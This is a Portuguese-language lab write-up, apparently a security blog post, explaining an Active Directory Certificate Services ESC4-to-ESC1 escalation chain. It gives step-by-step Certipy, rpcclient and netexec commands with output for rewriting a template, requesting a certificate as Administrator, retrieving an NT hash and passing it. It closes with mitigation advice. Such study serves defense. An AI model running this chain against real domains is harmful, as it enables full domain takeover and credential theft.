---
layout: post
title: "Do ESC4 ao Domain Admin: explorando templates vulneráveis no AD CS"
date: 2026-08-14
categories: [writeup, active-directory]
lang: pt
ref: adcs-esc1
permalink: /writeups/adcs-esc1
excerpt: "O Active Directory Certificate Services (AD CS) é uma das tecnologias mais poderosas, e quando mal configurada, uma das mais perigosas dentro de um ambiente AD. Nesse artigo, vou abordar um cenário que encontrei durante meus estudos em AD, envolvendo uma cadeia de exploração ESC4 -> ESC1."
---

# {{ page.title }}

<div style="font-family: monospace; font-size: 0.9em; opacity: 0.7; margin: 0.8rem 0 1.5rem 0;">
  <span>[active directory]</span> &bull; 
  <span>[writeup]</span> 
</div>

---

### **$ cat sumario.txt**
* TOC
{:toc}

---

O Active Directory Certificate Services (AD CS) é uma das tecnologias mais poderosas, e quando mal configurada, uma das mais perigosas dentro de um ambiente AD. Nesse artigo, vou abordar um cenário que encontrei durante meus estudos em AD, envolvendo uma cadeia de exploração ESC4 -> ESC1.

---

## 01. O que é o AD CS?

O **Active Directory Certificate Services (AD CS)** é o serviço de PKI (*Public Key Infrastructure*) da Microsoft integrado ao Active Directory. Ele permite que uma organização opere sua própria Autoridade Certificadora (CA) interna, emitindo certificados digitais para usuários, computadores e serviços.

Um dos usos mais relevantes do AD CS, e também um dos mais perigosos quando existe uma configuração insegura, é a autenticação baseada em certificados.

No Active Directory, determinados certificados podem ser utilizados durante a autenticação Kerberos por meio do **PKINIT (Public Key Cryptography for Initial Authentication)**. Em vez de provar sua identidade utilizando diretamente uma senha, o usuário pode apresentar um certificado válido associado à sua conta.

Isso significa que, caso um atacante consiga obter um certificado válido que seja aceito pelo domínio como pertencente a outro usuário, ele poderá se autenticar como essa identidade sem nunca precisar saber a sua senha.

Os certificados são emitidos com base em **Certificate Templates**, que definem, entre outras coisas:

- Quem pode solicitar um certificado utilizando aquele template;
- Quais EKUs (*Extended Key Usages*) estarão presentes no certificado, incluindo usos que permitem autenticação, como **Client Authentication** e **Smart Card Logon**;
- Se o solicitante pode fornecer informações de identidade no certificado, como o **Subject Alternative Name (SAN)**;
- Se a emissão exige aprovação manual;
- Se são necessárias assinaturas autorizadas;
- Quem possui permissões administrativas sobre o objeto do template no Active Directory.

<br>

Em 2021, a SpecterOps publicou a pesquisa **Certified Pre-Owned**, que catalogou uma série de configurações inseguras do AD CS. Essas técnicas ficaram conhecidas como **ESC1, ESC2, ESC3, ESC4** e assim por diante.

Neste artigo, o foco será principalmente em uma cadeia de exploração envolvendo **ESC4 → ESC1**.

O link para a pesquisa original da SpecterOps está listado nas referências.

---

## 02. O que é o ESC1?

O **ESC1** ocorre quando um Certificate Template permite que um usuário de baixo privilégio obtenha um certificado que possa ser utilizado para autenticação como outra identidade.

De forma simples, uma configuração típica de ESC1 apresenta as seguintes condições:

- O template permite que o solicitante forneça informações de identidade no certificado, normalmente através da flag `ENROLLEE_SUPPLIES_SUBJECT`;
- O template inclui uma EKU compatível com autenticação, como `Client Authentication`, `Smart Card Logon`, `PKINIT Client Authentication` ou equivalente;
- O template não exige aprovação manual de um Certificate Manager;
- O template não exige assinaturas autorizadas adicionais;
- Usuários de baixo privilégio possuem permissão para solicitar certificados utilizando esse template.

<br>

Quando essas condições coexistem, um usuário com permissão de enrollment pode solicitar um certificado informando uma identidade privilegiada no SAN, como a de um Domain Admin.

Como o template foi configurado para aceitar essas informações fornecidas pelo solicitante, a CA pode emitir o certificado contendo a identidade indicada.

Se o certificado puder ser corretamente mapeado para a conta-alvo pelo KDC, ele poderá então ser utilizado para autenticação Kerberos via PKINIT.

Em um cenário vulnerável, isso pode resultar na autenticação como uma conta privilegiada sem que sua senha seja conhecida.

---

## 03. É possível transformar um template em ESC1?

Sim! E um dos cenários que permite isso é o **ESC4**.

Diferentemente do ESC1, o ESC4 não é sobre a configuração do certificado em si, mas sim sobre **quem pode alterar a configuração do template**.

Certificate Templates são objetos armazenados no AD e, assim como outros objetos do diretório, possuem uma ACL (*Access Control List*).

Caso um usuário ou grupo de baixo privilégio possua direitos perigosos sobre o template, como:

- `GenericAll`;
- `WriteDacl`;
- `WriteOwner`;
- `WriteProperty` sobre atributos relevantes;

<br>

esse usuário ou grupo pode conseguir alterar as propriedades do template.

Isso permite, por exemplo:

- Habilitar `ENROLLEE_SUPPLIES_SUBJECT`;
- Adicionar EKUs compatíveis com autenticação;
- Remover exigência de Certificate Manager approval;
- Alterar requisitos de assinaturas;
- Modificar permissões de enrollment;
- Alterar a própria ACL do template, dependendo dos direitos disponíveis.

<br>

Assim, mesmo que o template originalmente não seja vulnerável a ESC1, um atacante com controle suficiente sobre ele pode modificar sua configuração e introduzir as condições necessárias para explorá-lo dessa forma.

É importante observar, entretanto, que controlar o objeto do template não significa automaticamente que uma CA irá emitir certificados através dele. Para que a cadeia seja diretamente explorável, o template precisa estar publicado por uma Enterprise CA acessível ao atacante.

---

## 04. Cadeia de exploração ESC4 → ESC1

```text
Usuário de baixo privilégio autenticado no domínio
            |
            v
   Enumera os templates AD CS
            |
            v
       Identifica um ESC4
            |
            v
Modifica o template vulnerável
            |
            v
      Introduz o ESC1
            |
            v
 Solicita um certificado como Administrator
            |
            v
         PKINIT
            |
            v
     Domínio comprometido.
```

---

## 05. Exploração

Uma das ferramentas mais utilizadas para enumeração e exploração ofensiva do AD CS é o **Certipy**.

Nesse exemplo, ele será utilizado a partir de uma máquina Linux. O mesmo tipo de ataque também pode ser realizado em ambientes Windows utilizando ferramentas como **Certify** e **Rubeus**.

### Reconhecimento

O primeiro passo é mapear os Certificate Templates e procurar condições vulneráveis.

```bash
certipy find \
  -u 'user@ad.local' \
  -p '<redacted>' \
  -dc-ip <domain-controller-ip> \
  -vulnerable \
  -stdout
```

<br>

Output:

```text
...
[+] User Enrollable Principals      : AD.LOCAL\Domain Users
[+] User ACL Principals             : AD.LOCAL\Authenticated Users
[!] Vulnerabilities
      ESC4                          : User has dangerous permissions.
```

<br>

O Certipy identifica automaticamente diversas configurações relacionadas a ESC1, ESC4 e outras técnicas de abuso do AD CS.

Nesse exemplo, o resultado indica que o `VulnTemplate` é suscetível a ESC4 porque um principal de baixo privilégio possui permissões perigosas sobre o objeto do template.

É recomendável confirmar exatamente quais direitos foram concedidos.

Isso pode ser feito analisando o output completo do Certipy ou utilizando ferramentas como `dacledit.py`, do Impacket.

Os direitos mais relevantes incluem, por exemplo:

- `GenericAll`;
- `WriteOwner`;
- `WriteDacl`;
- `WriteProperty`.

---

### Explorando o ESC4

Com o Certipy, é possível alterar automaticamente a configuração do template vulnerável.

```bash
certipy-ad template \
  -u 'user@ad.local' \
  -p '<redacted>' \
  -dc-ip <domain-controller-ip> \
  -template 'VulnTemplate' \
  -write-default-configuration
```

<br>

Output:

```text
Certipy v5.1.0 - by Oliver Lyak (ly4k)

Are you sure you want to apply these changes to 'VulnTemplate'? (y/N): y
[*] Successfully updated 'VulnTemplate'
```

<br>

A configuração padrão aplicada pelo Certipy transforma o template em uma configuração explorável, modificando atributos e permissões necessários para possibilitar a solicitação de certificados arbitrários.

Dependendo da versão da ferramenta, esse processo pode envolver alterações como:

- Habilitar `ENROLLEE_SUPPLIES_SUBJECT`;
- Adicionar EKUs de autenticação;
- Remover requisitos de aprovação;
- Alterar permissões relacionadas a enrollment.

<br>

**Importante:** em um pentest, sempre preserve a configuração original do template para restaurá-la depois.

---

## 06. Obtendo o SID do alvo

Após as mudanças introduzidas pela Microsoft no mapeamento de certificados no Active Directory, ambientes modernos passaram a utilizar mecanismos mais rígidos para associar um certificado a uma conta do domínio.

Por esse motivo, em um cenário ESC1 moderno não é recomendável depender apenas do UPN presente no SAN.

Ao solicitar o certificado com o Certipy, podemos informar também o **SID da conta-alvo**, permitindo que as informações necessárias para o mapeamento da identidade sejam incluídas no certificado.

Nesse exemplo, queremos comprometer a conta `Administrator`.

Primeiro, podemos obter o SID do domínio utilizando `rpcclient`:

```bash
rpcclient -U 'user%<redacted>' 192.168.116.130 -c 'lsaquery'
```

<br>

Output:

```text
Domain Name: AD
Domain Sid: S-1-5-21-2051240905-3916223753-3320999350
```

<br>

O SID retornado acima corresponde ao domínio, e não diretamente à conta `Administrator`.

Os SIDs de usuários do domínio seguem a estrutura:

```text
S-1-5-21-<domain-sid>-<RID>
```

No caso da conta **Administrator padrão do domínio**, o RID é `500`.

Portanto, conhecendo o Domain SID, podemos derivar o SID completo dessa conta:

```text
S-1-5-21-2051240905-3916223753-3320999350-500
```

<br>

É importante destacar que a conta Administrator built-in pode ser renomeada. O elemento relevante aqui é seu RID `500`, não necessariamente o nome atual da conta.

Também existem outras maneiras de obter diretamente o SID da conta-alvo, incluindo LDAP, BloodHound, PowerShell e ferramentas de enumeração do Active Directory.

Sempre que possível, consultar diretamente o SID da identidade desejada é preferível a depender de suposições.

---

## 07. Aplicando o ESC1

Com o template já modificado e o SID da conta-alvo identificado, podemos solicitar um certificado representando o Administrator.

```bash
certipy-ad req \
  -u 'user@ad.local' \
  -p '<redacted>' \
  -dc-ip 192.168.116.130 \
  -ca 'ad-DC01-CA' \
  -template 'VulnTemplate' \
  -upn 'administrator@ad.local' \
  -sid 'S-1-5-21-2051240905-3916223753-3320999350-500'
```

<br>

Output:

```text
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@ad.local'
[*] Certificate object SID is 'S-1-5-21-2051240905-3916223753-3320999350-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

<br>

A CA emite o certificado porque, do ponto de vista dela, o template está configurado para aceitar aquela solicitação.

O Certipy salva o certificado e sua chave privada localmente em um arquivo `.pfx`.

---

## 08. Autenticando com o certificado

Com o arquivo `.pfx`, podemos tentar autenticação Kerberos via PKINIT como a identidade representada no certificado.

```bash
certipy auth \
  -pfx administrator.pfx \
  -dc-ip <domain-controller-ip>
```

<br>

Output:

```text
[*] Certificate identities:
[*]     SAN UPN: 'administrator@ad.local'
[*]     SAN URL SID: 'S-1-5-21-2051240905-3916223753-3320999350-500'
[*]     Security Extension SID: 'S-1-5-21-2051240905-3916223753-3320999350-500'
[*] Using principal: 'administrator@ad.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ad.local': aad3b435b51404eeaad<redacted>:48cc66acfe<redacted>
```

<br>

O Certipy obtém um **TGT (Ticket Granting Ticket)** para a conta e salva o ticket em um arquivo `.ccache`.

Em determinadas condições, a ferramenta também consegue recuperar o hash NT da conta através da técnica conhecida como **UnPAC-the-hash**.

Com o hash obtido, podemos validar o acesso:

```bash
nxc smb 192.168.116.130 \
  -u administrator \
  -H '48cc66acfe<redacted>'
```

<br>

Output:

```text
SMB  192.168.116.130 445 WIN-O7IB1M8TPEM [*] Windows 11 / Server 2025 Build 26100 x64
SMB  192.168.116.130 445 WIN-O7IB1M8TPEM [+] ad.local\administrator:48cc66acfe<redacted> (Pwn3d!)
```

<br>

A partir desse ponto, temos acesso a conta Administrator, resultando no comprometimento total do domínio.

---

## 09. Impacto

Essa cadeia pode resultar no comprometimento total do domínio a partir de uma conta de baixo privilégio.

Em um cenário vulnerável, o atacante pode alcançar uma identidade privilegiada sem necessidade de:

- Movimento lateral prévio;
- Privilégios administrativos iniciais;
- Interação com outros usuários durante a exploração;
- Conhecimento da senha da conta privilegiada.

<br>

Entretanto, não significa que **qualquer** conta autenticada no domínio poderá necessariamente explorar ESC4.

A conta utilizada como ponto de partida precisa possuir, direta ou indiretamente, os direitos necessários sobre o objeto vulnerável ou pertencer a um grupo que possua essas permissões.

Contas comprometidas via phishing, credential stuffing, password spraying ou credenciais de serviços podem se tornar pontos de entrada para essa cadeia caso possuam acesso às permissões vulneráveis.

---

## 10. É melhor prevenir do que remediar...

A principal medida contra ESC4 é revisar as ACLs existentes sobre todos os Certificate Templates.

Grupos amplos e de baixo privilégio, como `Authenticated Users` e `Domain Users`, normalmente não devem possuir direitos de controle sobre templates, como:

- `GenericAll`;
- `WriteDacl`;
- `WriteOwner`;
- `WriteProperty` sobre atributos sensíveis.

<br>

Caso existam permissões administrativas delegadas, elas devem ser justificadas e limitadas ao menor conjunto possível de usuários.

Também é importante:

- Desabilitar `ENROLLEE_SUPPLIES_SUBJECT` quando a funcionalidade não for necessária;
- Restringir EKUs de autenticação apenas aos templates que realmente precisam delas;
- Revisar quais grupos possuem permissão de enrollment;
- Auditar periodicamente os templates publicados pelas Enterprise CAs;
- Manter Domain Controllers e servidores AD CS atualizados;
- Garantir que mecanismos modernos de strong certificate mapping estejam habilitados;
- Monitorar alterações em objetos de Certificate Template;
- Monitorar solicitações de certificados anormais envolvendo identidades privilegiadas.

---

## 11. Conclusão

O AD CS adiciona uma camada poderosa de autenticação e gerenciamento de identidades ao Active Directory, mas essa mesma integração pode transformar erros de permissão aparentemente simples em caminhos críticos de **privilege escalation**.

O ESC4 é um bom exemplo disso.

Uma ACL insegura sobre um Certificate Template pode permitir que um usuário de baixo privilégio altere completamente seu comportamento e introduza uma configuração compatível com ESC1.

A partir daí, o atacante pode solicitar um certificado representando uma identidade privilegiada e utilizar PKINIT para se autenticar como essa conta.

Por isso, ambientes Active Directory devem tratar Certificate Templates como objetos altamente sensíveis, aplicando controle de acesso rigoroso, auditoria contínua e monitoramento das alterações realizadas no AD CS.

---

## 12. Referências

- SpecterOps — Certified Pre-Owned: https://specterops.io/blog/2021/06/17/certified-pre-owned/
- Certipy: https://github.com/ly4k/Certipy
- Certipy Wiki — Privilege Escalation: https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
- Microsoft — Active Directory Certificate Services: https://learn.microsoft.com/pt-br/windows-server/identity/ad-cs/
- Microsoft — KB5014754: Certificate-based authentication changes on Windows domain controllers: https://support.microsoft.com/help/5014754
